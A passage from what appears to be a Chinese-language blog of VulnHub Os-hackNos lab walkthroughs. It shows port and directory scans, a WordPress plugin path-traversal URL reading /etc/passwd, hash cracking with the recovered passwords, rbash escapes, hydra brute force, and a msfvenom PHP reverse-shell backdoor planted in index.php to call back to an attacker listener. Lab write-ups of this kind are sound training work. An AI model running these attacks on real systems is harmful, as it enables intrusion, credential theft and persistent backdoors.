<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">happy_hacker</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<p><strong>另一个思路</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">snap --version</span><br><span class="line"></span><br><span class="line">snap    2.34.2ubuntu0.1  </span><br><span class="line">snapd   2.34.2ubuntu0.1  </span><br><span class="line">series  16               </span><br><span class="line">ubuntu  16.04            </span><br><span class="line">kernel  4.4.0-142-generic</span><br></pre></td></tr></table></figure>
<p>CVE-2019-7304一把梭</p>
<hr />
<p>补充一些细节<br />
由于Kali在VMware下而Ubuntu在VBox，导致网络有些问题<br />
Kali可以连通Ubuntu但是反之不行<br />
即Kali可以用EXP获取Shell但Ubuntu不能反弹Shell给Kali<br />
所以需要Windows用MSF接收反弹Shell</p>
<p>在EXP的Shell中，wget获取的文件权限为644且所有者为root，即不能直接wget一个Meterpreter后门程序并执行<br />
但可以用wget获取weevely的WebShell，644的权限且所有者为root并不会影响WebShell的连接，而且在WebShell中，可以进行文件上传和下载，wget所得的文件权限为644，所有者为www-data，即可以用WebShell获取Meterpreter后门程序</p>
<p>在wget一个WebShell之前，要修改文件后缀名<br />
服务器会把php后缀的文件解析并执行，就不能获取该php文件<br />
而修改文件后缀名之后服务器则无法解析，从而获取WebShell<br />
在获取之后修改文件后缀名为.php，并移动到Web目录下<br />
即可连接WebShell</p>
<p>切换用户需要一个标准Shell<br />
可以在Meterpreter中获取</p>
<hr />
<h1 id="os-hacknos-2"><a class="markdownIt-Anchor" href="#os-hacknos-2"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">Os-hackNos-2</a></h1>
<p><code>2020/01/10 23:58:25</code></p>
<h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2>
<p><code>nmap -sV -Pn -v -T5 -A 192.168.1.104</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.104</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h2>
<p><code>dirb http://192.168.1.104 -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.104&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2>
<p>Web服务采用了Wordpress框架</p>
<p>使用wpscan针对wordpress进行扫描</p>
<p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate u</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>发现存在用户user</p>
<p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate p</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure>
<p>存在插件<code>gracemedia-media-player</code></p>
<p>搜索得到相关EXP<br />
<code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p>
<p>得到两条重要信息</p>
<ul>
<li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li>
<li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li>
</ul>
<p>可以破解flag账户的密码</p>
<p>使用john进行字典爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line"></span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure>
<p>使用flag账户登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh flag@192.168.1.104</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2>
<p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>以上三条命令均可(但是更推荐用下面的方法获取TTY)</p>
<p>或者使用python获取一个支持完全交互的TTY(如果目标机器上只有python3而没有python2，则改为python3执行即可)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>尝试直接sudo提权，失败</p>
<p>尝试在目标服务器内搜索信息</p>
<p>发现文件<code>/var/backups/passbkp/md5-hash</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash </span><br><span class="line"></span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure>
<p>得到rohit账户的密码</p>
<p>使用john破解密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line"></span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure>
<p>切换到rohit账户，并尝试sudo提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<p>总体来看渗透难度并不高，但是这里我想稍微记录一些关于wpscan的内容<br />
wpscan是一个基于ruby，针对wordpress框架的web扫描器<br />
但是之前kali上一直运行不了wpscan，一直以为是wpscan软件的问题，多次失败之后才发现是ruby的问题<br />
官网有这么一句话<br />
<strong>(Optional but highly recommended: RVM)</strong><br />
现在看来也觉得确实如此<br />
所以一番折腾之后终于在非root用户上安装好了rvm，然后换ruby源，安装ruby2.5.5，换gem源，再用gem安装一遍wpscan<br />
最后终归是能正常使用wpscan了</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://rvm.io/rvm/install">rvm</a><br />
<a target="_blank" rel="noopener" href="https://ruby-china.org/wiki/rvm-guide">rvm</a><br />
<a target="_blank" rel="noopener" href="https://blog.51cto.com/autopython/1839229">wpscan</a><br />
<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/174663.html">rvm</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuaile1314/p/12132730.html">wp</a></p>
</blockquote>
<hr />
<h1 id="os-hacknos-3"><a class="markdownIt-Anchor" href="#os-hacknos-3"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">Os-hackNos-3</a></h1>
<p><code>2020/01/19 21:46:32</code></p>
<h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.39</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.39</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)</span><br><span class="line">|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)</span><br><span class="line">|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: WebSec</span><br><span class="line">MAC Address: 08:00:27:19:3A:EE (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-3"><a class="markdownIt-Anchor" href="#web路径枚举-3"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径<br />
未发现有效信息<br />
在主页处有提示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find the Bug</span><br><span class="line">You need extra WebSec </span><br></pre></td></tr></table></figure>
<p>发现存在Web路径<code>/websec</code><br />
再针对该路径进一步扫描</p>
<p><code>dirb http://192.168.31.39/websec/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;0 (CODE:200|SIZE:4346)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;01 (CODE:200|SIZE:4644)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1 (CODE:200|SIZE:4644)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1x1 (CODE:200|SIZE:4644)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;about (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;About (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;admin (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;api (CODE:200|SIZE:0)                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;assets (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;author (CODE:200|SIZE:4208)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;blog (CODE:200|SIZE:4346)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;category (CODE:200|SIZE:4366)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;cm (CODE:500|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;feed (CODE:200|SIZE:765)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;fm (CODE:200|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;lib (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;log (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;login (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;robots.txt (CODE:200|SIZE:65)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;sites (CODE:301|SIZE:331)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;src (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tag (CODE:200|SIZE:4361)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tags (CODE:200|SIZE:3554)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;test (CODE:301|SIZE:329)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;themes (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tmp (CODE:301|SIZE:327)</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2>
<p>WEB服务存在登录页面<br />
主页中已经给出了一个联系邮箱:<code>contact@hacknos.com</code><br />
可以利用hydra进行口令枚举</p>
<p>使用top6000弱口令进行枚举</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P FuzzDicts-master&#x2F;passwordDict&#x2F;top6000.txt -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br></pre></td></tr></table></figure>
<p>未获得账户口令</p>
<p>使用cewl获取页面内容来作为口令<br />
<code>cewl http://192.168.31.39/websec -w pass</code></p>
<p>使用网站内容作来枚举账户口令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P pass -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.31.39   login: contact@hacknos.com   password: Securityx</span><br></pre></td></tr></table></figure>
<p>得到Web账户权限</p>
<h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2>
<p>Web页面中可以在左侧菜单中选择<code>Content &gt; File Manager</code>来管理文件<br />
尝试写入Webshell，但是无法访问到文件</p>
<p>尝试使用msfvenom创建基于php的meterpreter后门，再写入到index.php中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">cat shell.php</span><br></pre></td></tr></table></figure>
<p>将内容复制到index.php文件末</p>
<p>在MSF中接收Meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>在Meterpreter的shell中切换至交互shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br><span class="line">   uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
<p>查看/etc/passwd文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 